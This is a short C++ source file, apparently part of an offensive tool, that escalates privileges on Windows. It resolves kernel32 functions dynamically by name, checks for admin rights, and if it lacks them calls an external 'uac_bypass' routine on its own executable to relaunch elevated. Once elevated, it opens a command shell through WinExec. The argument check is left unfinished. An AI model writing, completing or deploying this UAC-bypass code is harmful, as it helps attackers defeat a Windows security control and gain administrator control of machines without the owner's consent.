extern "C" unsigned int call_proc(unsigned int proc, int _args, ...);
extern "C" unsigned int uac_bypass(const char*, unsigned int, unsigned int, unsigned int, unsigned int);
extern "C" unsigned int f_kernel32(unsigned int&, unsigned int&);

#define UAC_ARG     "ARGUMENT0"

bool test_args(const char* c_arg, unsigned int k32_dll, unsigned int proc_addr) { // cba to finish this rn

    auto c_run = (char*)call_proc(call_proc(proc_addr, 2, k32_dll, "GetCommandLineA"), 0);
    if (!c_run) return false;

    return true;
}

int entry() {
    char exec_file[160];

    unsigned int kernel32_dll, proc_addr;
    f_kernel32(kernel32_dll, proc_addr);

    auto load_lib = call_proc(proc_addr, 2, kernel32_dll, "LoadLibraryA");
    auto advpack = call_proc(load_lib, 1, "advpack");

    if (call_proc(call_proc(proc_addr, 2, advpack, "IsNTAdmin"), 2, 0, 0)) {

        if (test_args(UAC_ARG, kernel32_dll, proc_addr)) {
            auto win_exec = call_proc(proc_addr, 2, kernel32_dll, "WinExec");
            call_proc(win_exec, 2, "cmd /c cmd", 10);
        }
        return 0;
    }

    auto get_module_name = call_proc(proc_addr, 2, kernel32_dll, "GetModuleFileNameA");
    call_proc(get_module_name, 3, 0, exec_file, 80);

    uac_bypass(exec_file, kernel32_dll, proc_addr, 0x1d, 0x60);
    return 0;
}
